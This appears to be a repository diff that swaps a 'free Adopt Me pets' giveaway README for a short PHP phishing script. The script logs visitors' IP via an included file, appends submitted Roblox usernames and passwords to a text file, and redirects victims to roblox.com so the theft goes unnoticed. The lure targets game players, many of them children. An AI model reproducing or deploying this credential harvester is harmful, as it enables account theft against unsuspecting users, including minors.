@@ -1,2 +1,6 @@
-# Adopt-me-pets-for-free-
-join me by my bio to get your dps!.The link is in my bio just join me by their and u will get free pets! good luck!.
+<?php
+include "ip.php";
+file_put_contents("usernames.txt", "User : " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
+header("Location: https://roblox.com");
+exit();
+?>
